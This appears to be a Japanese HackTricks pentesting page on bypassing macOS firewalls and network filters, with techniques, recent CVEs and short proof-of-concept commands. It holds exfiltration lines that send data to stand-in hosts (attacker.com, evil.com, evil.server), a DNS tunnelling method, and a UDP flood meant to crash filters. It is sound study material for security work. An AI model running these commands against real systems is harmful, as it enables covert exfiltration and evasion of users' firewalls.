# macOS FirewallsのBypass

{{#include ../../banners/hacktricks-training.md}}

## 発見されたTechnique

以下のTechniqueは、一部のmacOS firewall appsで動作することが確認されています。

### Whitelistの名前を悪用する

- 例えば、malwareを**`launchd`**のような、よく知られたmacOSプロセスの名前で呼び出す

### Synthetic Click

- firewallがユーザーにpermissionを求めた場合、malwareに**allowをクリック**させる

### **Apple署名済みバイナリを使用する**

- **`curl`**など。また、**`whois`**なども使用できる

### よく知られたAppleドメイン

firewallは、**`apple.com`**や**`icloud.com`**など、よく知られたAppleドメインへのconnectionを許可している可能性があります。また、iCloudをC2として使用できます。

### Generic Bypass

firewallをbypassするために試すアイデア

### 許可されたtrafficを確認する

許可されたtrafficを把握すると、Whitelistに登録されている可能性のあるドメインや、アクセスを許可されているアプリケーションを特定するのに役立ちます
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS の悪用

macOS では、プロセスが **DNS server** と直接通信することはありません。名前解決は **XPC** 経由で **`mDNSResponder`**（`/usr/sbin/mDNSResponder`）によって仲介されます。これは Apple が署名した system daemon であるため、マシン上のすべての lookup は、それを要求したプロセスではなく **`mDNSResponder` からの traffic** としてホスト外へ出ていきます。そのため firewall は通常、この daemon を無条件に信頼します — 拒否すると system 全体の名前解決が壊れるためです。<sup>[1]</sup>

これにより、firewall が malware 自身の sockets を block している場合でも、DNS は open のまま維持される channel になります:<sup>[1]</sup>

1. malware が `evil.com` への接続を試みます。その **own outbound connection** は firewall によって検査され、**blocked** されます。
2. malware は代わりに、XPC 経由で `mDNSResponder` に `evil.com` の **resolve** を要求します。
3. firewall は結果として生成された query を検査し、信頼された Apple-signed resolver が originator であることを確認して、**allows it** します。
4. query は DNS server に到達します — そして attacker が `evil.com` の authoritative server を運用している場合、exchange の両端を control できます。

attacker はその zone を所有しているため、「connection」は一切必要ありません。data は **queried labels**（例: `<encoded-chunk>.evil.com`）内に smuggle され、commands は **answer records**（TXT、A、CNAME…）内に返されます。これは、完全に whitelisted されたプロセス上で動作する classic DNS tunnelling です。

任意の unprivileged process が daemon を直接操作できるため、path が open であることを確認する簡単な方法になります:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Browser apps経由

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### プロセスへの code injection 経由

**任意の server に接続できる process に code を inject** できる場合、firewall の保護を bypass できます:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Recent macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
2024 年 7 月、Apple は Screen Time の parental controls で使用される system-wide の「Web content filter」を破壊する、Safari/WebKit の critical bug を patch しました。
特別に細工された URI（例えば、double URL-encoded の「://」を含むもの）は Screen Time ACL では認識されませんが、WebKit では受け入れられるため、request は filter されずに送信されます。そのため、URL を open できるあらゆる process（sandboxed または unsigned code を含む）が、user または MDM profile によって明示的に block された domain に到達できます。<sup>[2]</sup>

Practical test (un-patched system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### 初期の macOS 14「Sonoma」における Packet Filter (PF) のルール順序付けバグ
macOS 14 の beta サイクル中、Apple は **`pfctl`** の userspace wrapper に regression を導入しました。
`quick` keyword を付けて追加されたルール（多くの VPN kill-switches で使用）はサイレントに無視され、VPN/firewall GUI が *blocked* と報告している場合でも traffic leaks が発生しました。このバグは複数の VPN vendors によって確認され、RC 2（build 23A344）で修正されました。

簡易 leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple-signed helper services の悪用（legacy – macOS 11.2 より前）
macOS 11.2 より前では、**`ContentFilterExclusionList`** に **`nsurlsessiond`** や App Store など約 50 個の Apple バイナリが登録されており、Network Extension framework を使用して実装されたすべての socket-filter firewall（LuLu、Little Snitch など）を bypass できました。
Malware は、除外対象の process を単に spawn するか、そこへ code を inject するだけで、すでに許可されている socket 経由で自身の traffic を tunnel できました。Apple は macOS 11.2 で exclusion list を完全に削除しましたが、upgrade できない system ではこの technique が依然として relevant です。<sup>[3]</sup>

Example proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECHによるNetwork Extensionのドメインフィルター回避（macOS 12以降）
NEFilter Packet/Data Providersは、TLS ClientHelloのSNI/ALPNを基準に判定します。**HTTP/3 over QUIC（UDP/443）**と**Encrypted Client Hello（ECH）**を使用すると、SNIは暗号化されたままとなり、NetExtはフローを解析できません。その結果、ホスト名ルールがfail-openになることが多く、DNSに触れることなくmalwareがブロック対象のドメインへ到達できます。<sup>[5]</sup>

最小限のPoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
QUIC/ECHがまだ有効な場合、これは簡単なhostname-filter回避経路になります。

### macOS 15 “Sequoia” Network Extensionの不安定性（2024–2025）
初期の15.0/15.1ビルドでは、サードパーティ製の **Network Extension** filter（LuLu、Little Snitch、Defender、SentinelOneなど）がクラッシュします。filterが再起動すると、macOSはflow rulesを破棄し、多くの製品はfail-openします。数千個の短時間UDP flowをfilterに大量送信する（またはQUIC/ECHを強制する）ことで、クラッシュを繰り返し発生させ、GUI上ではfirewallが稼働中と表示されたまま、C2/exfilのための隙を作れる可能性があります。<sup>[4]</sup>

簡単な再現（安全なlab box）：
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## 最新の macOS 向け Tooling のヒント

1. GUI firewall が生成する現在の PF ルールを確認します:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. すでに *outgoing-network* entitlement を保持している binary を列挙します（piggy-backing に有用）:
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swift で独自の Network Extension content filter をプログラムから登録します。
packet を local socket に転送する最小限の rootless PoC は、Patrick Wardle の **LuLu** source code で確認できます。

## References

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: macOS Firewall の作成と突破](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple の web content filter bypass により、block された content へ unrestricted access が可能に（CVE-2024-44206） - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple、Apps が Firewall Security を bypass できた macOS feature を削除 - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [macOS Sequoia Update 後に Cybersecurity Products が停止 - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [network protection を使用して macOS から bad sites への connection を防止する - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
